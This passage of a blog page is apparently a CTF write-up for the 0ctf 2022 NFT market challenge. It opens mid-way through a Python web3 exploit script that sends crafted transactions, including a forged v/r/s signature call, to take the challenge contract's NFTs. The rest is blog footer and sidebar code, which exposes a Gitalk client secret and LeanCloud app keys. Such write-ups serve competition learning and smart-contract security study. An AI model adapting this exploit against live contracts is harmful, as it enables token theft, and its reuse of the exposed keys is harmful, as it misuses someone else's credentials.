Web3.toChecksumAddress(attack_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;attack1 success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;airdrop()&apos;).hex()[:10]</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;airdrop() success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;approve(address,uint256)&apos;).hex()[:10]</span><br><span class="line">data += TctfMarket_address[2:].rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;2710&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;approve(TctfMarket_address,10000) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;transfer(address,uint256)&apos;).hex()[:10]</span><br><span class="line">data += attack_address[2:].rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;2&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(tctfToken_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;transfer(attack_address,2) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;purchaseOrder(uint256)&apos;).hex()[:10]</span><br><span class="line">data += &apos;1&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;purchaseOrder(1) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;createOrder(address,uint256,uint256)&apos;).hex()[:10]</span><br><span class="line">data += attack_address[2:].rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;3&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;1&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;createOrder(attack,3,1) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;purchaseOrder(uint256)&apos;).hex()[:10]</span><br><span class="line">data += &apos;0&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(TctfMarket_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;purchaseOrder(0) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;attackfor3(uint8,bytes32,bytes32)&apos;).hex()[:10]</span><br><span class="line">data += v[2:].rjust(64,&apos;0&apos;)</span><br><span class="line">data += r[2:].rjust(64,&apos;0&apos;)</span><br><span class="line">data += s[2:].rjust(64,&apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line"># print(txn_receipt)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;attackfor3(v,r,s) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;attack4()&apos;).hex()[:10]</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(attack_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;attack4() success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line">print(&quot;EOA account&quot;,public)</span><br><span class="line">print(&quot;token1 owner:&quot;,TctfNFT_contract.functions.ownerOf(1).call())</span><br><span class="line">print(&quot;token2 owner:&quot;,TctfNFT_contract.functions.ownerOf(2).call())</span><br><span class="line">print(&quot;token3 owner:&quot;,TctfNFT_contract.functions.ownerOf(3).call())</span><br></pre></td></tr></table></figure>
+      <script>
+        window.disqusProxy={
+          shortname: 'undefined',
+          username: 'pikachu',
+          server: 'undefined',
+          port: 5509,
+          adminAvatar: '/avatars/admin-avatar.jpg',
+          identifier: '2022/0ctf2022/',
+        };
+        window.disqus_config = function () {
+          this.page.url = window.location.href;
+          this.page.identifier = window.disqusProxy.identifier;
+        };
+      </script>
+      
+    </div>
+
+<div style="text-align:center;color: #ccc;font-size:14px;">---------------- The End ----------------</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>谢谢大爷～</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/donate/wechat.png" alt="pikachu WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/donate/alipay.jpg" alt="pikachu Alipay">
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+<div>
+	  
+	    <p id="div-border-left-red">
+		Author：<b>pikachu</b><br>
+		Link：<a href="/2022/0ctf2022/" title="0ctf 2022 nft market">https://hitcxy.com/2022/0ctf2022/</a><br>
+		Contact：<a>hitcxy.cn@gmail.com</a><br>
+	   <b>本文基于<a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/" rel="external nofollow noopener noreferrer"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布</b><br>
+	    <b>转载请注明出处，谢谢！</b>
+	    </p>
+	  
+	</div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/0ctf2022/" rel="tag"><i class="fa fa-tag"></i> 0ctf2022</a>
+          
+            <a href="/tags/NFT/" rel="tag"><i class="fa fa-tag"></i> NFT</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/bytebyte/" rel="next" title="qwb2022 第六届强网杯线上赛区块链 bytebyte">
+                <i class="fa fa-chevron-left"></i> qwb2022 第六届强网杯线上赛区块链 bytebyte
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="gitalk-container"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar/1.jpg" alt="pikachu">
+          <p class="site-author-name" itemprop="name">pikachu</p>
+          <p class="site-description motion-element" itemprop="description">帅 | 码渣 | 宅 | 金木粉</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hitcxy" target="_blank" rel="external nofollow noopener noreferrer" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-sa/4.0/" class="cc-opacity" target="_blank" rel="external nofollow noopener noreferrer">
+              <img src="/images/cc-by-sa.svg" alt="Creative Commons">
+            </a>
+          </div>
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              参考的博客
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://yangbingdong.com/" title="ookamiAntD" target="_blank" rel="external nofollow noopener noreferrer">ookamiAntD</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        <div id="days"></div>
+    <script>
+    function show_date_time(){
+        window.setTimeout("show_date_time()", 1000);
+        BirthDay=new Date("09/16/2019 21:51:10");
+        today=new Date();
+        timeold=(today.getTime()-BirthDay.getTime());
+        sectimeold=timeold/1000
+        secondsold=Math.floor(sectimeold);
+        msPerDay=24*60*60*1000
+        e_daysold=timeold/msPerDay
+        daysold=Math.floor(e_daysold);
+        e_hrsold=(e_daysold-daysold)*24;
+        hrsold=setzero(Math.floor(e_hrsold));
+        e_minsold=(e_hrsold-hrsold)*60;
+        minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+        seconds=setzero(Math.floor((e_minsold-minsold)*60));
+        document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+    }
+function setzero(i){
+    if (i<10)
+    {i="0" + i};
+    return i;
+}
+show_date_time();
+</script>
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Source"><span class="nav-number">1.</span> <span class="nav-text">Source</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">2.</span> <span class="nav-text">EXP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+	<!-- <img style="position: absolute;top: 0;left: 15%;border: 0;width: 200px;height: 200px;" src="http://ojoba1c98.bkt.clouddn.com/img/coding-flag.png" alt="Coding Flag"> -->
+      <div class="footer-inner">
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user">本站访客数</i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span>人次</span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye">本站总访问量</i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span>次</span>
+  
+  
+</div>
+
+
+
+        <div class="copyright">
+  
+  &copy;  2019 - 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-flash"></i>
+  </span> | <span class="post-count">共63.7k字</span>
+</div>
+
+
+<!-- <div class="theme-info">
+  由  强力驱动
+</div> --!>
+
+<div style="width:300px;margin:0 auto;">
+  <a target="_blank" href="http://beian.miit.gov.cn/" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
+    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖ICP备20013338号-1</p>
+  </a>
+</div>
+
+<div style="width:300px;margin:0 auto;">
+  <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=34122102000129" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;">
+    <img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/beian.png" style="float:left;"/>
+    <p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#555;">皖公网安备 34122102000129号</p>
+  </a>
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '4a72d4eaaea7eaad13f1',
+      clientSecret: '6278369a1479d150ae4c6f0d10b22141aa1e02b3',
+      repo: 'BlogComment',
+      owner: 'hitcxy',
+      admin: ['hitcxy'],
+      id: location.pathname,
+      distractionFreeMode: 'false'
+    })
+    gitalk.render('gitalk-container')
+  </script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("8Irorb3IRbCGqRd9obk9KD98-gzGzoHsz", "DCF1KCbdAOySKCu1Ooc0J5ku");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+  <script type="text/javascript" color="255,0,204" opacity='0.5' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+
+
+
+
+
+<!--卖萌-->
+<script type="text/javascript" src="/js/src/dytitle.js"></script>
+</div></footer></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"superSample":2,"width":200,"height":300,"position":"left"},"mobile":{"show":true},"react":{"opacityDefault":0.9,"opacityOnHover":0.5},"log":false});</script></body>
+</html>
